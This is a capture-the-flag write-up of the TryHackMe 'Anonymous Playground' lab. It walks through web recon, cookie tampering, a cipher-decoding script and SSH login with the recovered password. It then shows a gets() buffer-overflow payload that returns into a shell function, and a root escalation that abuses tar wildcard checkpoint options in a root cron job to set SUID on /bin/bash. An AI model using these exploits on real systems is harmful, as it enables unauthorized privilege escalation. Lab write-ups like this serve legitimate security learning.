# Anonymous Playground TryHackMe WriteUp  
### Machine IP = 10.112.177.163  
Firstly, lets amke a rust scan:  
```bash  
rustscan -a 10.112.177.163
```
Only ssh(22) and http(80) ports are open. Lets explore the website:  
When I look at the web-site, I saw an Anonymous Mask in there. The first thing that I thought was that this mask contains encrypted secret message and also the hint on the source code caused me to think like this: "<!-- Does this text being slightly off-center trigger you too? -->" But It was a rabbit hole. There wasn't anything special with it.    
So, I decided to make a directory scan:    
```bash
ffuf -u http://10.112.177.163/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 0 -t 300 -fs 11540
```
Only the robots.txt file was interesting from this scan. Let's explore it:      
<img width="1073" height="246" alt="image" src="https://github.com/user-attachments/assets/82d41cbd-3ba1-4843-93df-54a250996931" />    
We got a secret folder. When I access it, I saw that it is a useless web-page but wait!!, there is a hint:    
<img width="564" height="286" alt="image" src="https://github.com/user-attachments/assets/6a43c523-d378-46c4-87cb-fb59519c46ed" />    
Our access is denied because we are not granted. Lets check the cookie section maybe we can manipulate it.      
<img width="3199" height="304" alt="image" src="https://github.com/user-attachments/assets/545bdff4-7a09-4e18-8831-7fc2ba03674e" />    
I change it from this to this:    
<img width="3199" height="304" alt="image" src="https://github.com/user-attachments/assets/71030c04-a75e-45a2-bbf2-b563c42f6e57" />    
And bingoooo!!!, I got a encrypted message.     
<img width="1051" height="383" alt="image" src="https://github.com/user-attachments/assets/3ae525ee-af9a-4529-8700-28d9e2f907d3" />    
It looks like a login parameters like credentials. I spent hours for decrypting it but I got nothing. Then I noticed that there was a list of names on the web-page's operatives section:    
<img width="561" height="1059" alt="image" src="https://github.com/user-attachments/assets/9b61e1e5-014b-43f4-9db9-6b8e2e67dde2" />    
Hmm, As we can see our credentials look like username::password --> hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN  -->  I noticed that in name section each letter was encoded with two lettes. Because there is two 'zA' in the name. When I look at the name list, I thought that only the 'magna' user is suitable for this encrypted name. I wrote a python payload for decrypting the gull credential by using the known algorithm.   
```bash  
  GNU nano 8.7                            chiper.py                                                                                                                
def decode_custom_cipher(encoded_str):
    # İkili qruplara bölürük
    pairs = [encoded_str[i:i+2] for i in range(0, len(encoded_str), 2)]
    decoded = ""
    
    for pair in pairs:
        # Birinci simvol (kiçik hərf)
        first = ord(pair[0])
        # İkinci simvolun (böyük hərf) əlifba sırası (A=1, B=2...)
        # ord('A') = 65, ona görə ord(pair[1]) - 64 bizə sıranı verir
        second = ord(pair[1]) - 64

        # Real hərfi tapmaq üçün: birinci + ikinci
        # Bəzi hallarda bu cəm 122-ni (z) keçirsə, geri fırlanır (wrap around)
        char_code = first + second
        if char_code > 122: # 'z'-dən sonrasını 'a'-ya qaytarmaq üçün
            char_code = 96 + (char_code - 122)

        decoded += chr(char_code)
    
    return decoded

# Şifrələr
user_enc = "hEzAdCfHzA"
pass_enc = "hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"

print(f"User: {decode_custom_cipher(user_enc)}")
print(f"Pass: {decode_custom_cipher(pass_enc)}")
```
It gave a result like this:    
<img width="641" height="164" alt="image" src="https://github.com/user-attachments/assets/c865cbf3-f620-4a81-a3ef-0d7fc6fdf1cc" />    

----
### User flag  
Now, I can access magna user via ssh:  
```bash  
ssh magna@10.112.177.163
password:magnaisanelephant
We got the first flag from there.
```

----  
### 2nd User Flag  
There was a program which help us to be second user. Lets look at the vulnerability and how to use it for getting second user:    
1. Finding the Vulnerability (Vulnerability Research)  

To analyze the program, we use the nm (name list) command. This command shows us the "address book" of all functions inside the binary. Two key functions catch our attention:  
```bash
magna@ip-10-112-177-163:~$ nm hacktheworld
0000000000601058 B __bss_start
0000000000400657 T call_bash
0000000000601058 b completed.7698
0000000000601048 D __data_start
0000000000601048 W data_start
00000000004005b0 t deregister_tm_clones
00000000004005a0 T _dl_relocate_static_pie
0000000000400620 t __do_global_dtors_aux
0000000000600e18 d __do_global_dtors_aux_fini_array_entry
0000000000601050 D __dso_handle
0000000000600e20 d _DYNAMIC
0000000000601058 D _edata
0000000000601060 B _end
0000000000400784 T _fini
0000000000400650 t frame_dummy
0000000000600e10 d __frame_dummy_init_array_entry
000000000040098c r __FRAME_END__
                 U gets@@GLIBC_2.2.5
0000000000601000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
0000000000400828 r __GNU_EH_FRAME_HDR
00000000004004e0 T _init
0000000000600e18 d __init_array_end
0000000000600e10 d __init_array_start
0000000000400790 R _IO_stdin_used
0000000000400780 T __libc_csu_fini
0000000000400710 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
00000000004006d8 T main
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
00000000004005e0 t register_tm_clones
                 U setuid@@GLIBC_2.2.5
                 U sleep@@GLIBC_2.2.5
0000000000400570 T _start
                 U system@@GLIBC_2.2.5
0000000000601058 D __TMC_END__

```

    gets@@GLIBC_2.2.5: This function takes input from the user, but its biggest flaw is that it "does not know any boundaries." It doesn't check the memory limit allocated by the program; it simply shoves whatever the user writes into memory. We can write unlimited thing into there.

    system@@GLIBC_2.2.5: This function is used to execute system commands. A hidden function named call_bash exists inside the program, created specifically to give us a root terminal (shell) using this system call. Normally, the program never calls this function; we must force it to go there.

2. The Structure of Memory (The Stack) and the "Limit"  

When the program runs, it takes a space in RAM called the "Stack". Think of this as three containers stacked on top of each other:  

    Buffer (64 bytes): The space where our input (our name) is stored.  

    Saved RBP (8 bytes): A small "container" that stores the previous version of the program.  

    Return Address (RIP - 8 bytes): This is the "navigation system." When a function finishes its task, it reads this address to know where to go next. Normally, this points back to the safe exit of the program, there is a normal exit address of the program itself.  

The Stack Limit: The programmer allocated exactly 64 bytes for our input. If we write 64 + 8 (RBP) = 72 bytes of data, the stack reaches its limit. After the 73rd byte, anything we write will written directly on top of that critical Return Address (this is called overwriting), the previous normal, stabile exit return address is removed and our new address is written.  
3. The "Target Address" and the Secret of 16-byte Alignment  
  
Using the nm command, we find that the address of the call_bash function is 0x400657. However, jumping directly to this address doesn't always work. Why?  

    The Push RBP Obstacle: At the very beginning of the address 400657, there is a command called push rbp. This command tries to load an additional 8 bytes onto the stack.  

    Stack Alignment (16-byte discipline): On 64-bit Linux systems, the system() function requires the memory address (the Stack Pointer) to be perfectly divisible by 16 to function. We defined the program also work on 64bit system by the help of this command: **objdump -d ./hacktheworld | grep -A 20 "<main>:"** It will show something like 0x40 and it equals 64 in hexademical system.  

Because we have already "fill" the memory by writing 72 bytes, jumping to the very start of the function (400657) causes that first push command to break this 16-byte discipline, because the memory will be (72+8=80). The CPU sees that the "balance is lost" and immediately shuts down the program (Segmentation Fault). So, we must make it something that will not be perfectly divisible by 16 because system use this discipline for security how can i say. It ensures that if the memory bytes are divisible to 16, finish the work and return the return address. We must broke it so, we must escape this "push rbp".  

The Solution: We jump one step further into the function—to address 400658. By doing this, we skip (escape) the push command. The 16-byte balance remains intact, and the program agrees to open the shell for us.  
4. The Final Attack Command (The Payload)  

After all this reconnaissance, we build our final command like this:  
```bash
(python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./hacktheworld
```
Sends 72 A characters: to overflow the buffer.  

    Sends the return address: as binary form.

    ;cat: allow us to work on shell after the program finis its work, otherwise at the moment it gave us shell, it will also close it immediately.

    | ./hacktheworld: Feeds the combined output directly into the vulnerable binary.

Now, I can be "spooky" user and get the last User Flag:      
<img width="1531" height="344" alt="image" src="https://github.com/user-attachments/assets/682fbbd6-65be-4e08-84cf-e38408b5f768" />      

----
### Root Flag  
There is a script like ".webscript". I decided to look at /etc/crontab file at first. I noticed a simple tar vulnerability in there:  
-- cd /home/spooky && tar -zcf /var/backups/spooky.tgz *  
It is executed with root permission in each minute. So simply we need to add malicious tar commands as files in the spooky's folder. The script will automatically execute all the executable files in the spooky's folder includingly our malicious commands.   
```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh .webscript"
echo '#!/bin/sh' > .webscript
echo 'chmod +s /bin/bash' >> .webscript
chmod +x .webscript
/bin/bash -p
```
Yeah I am simply root at the end !!!!  
















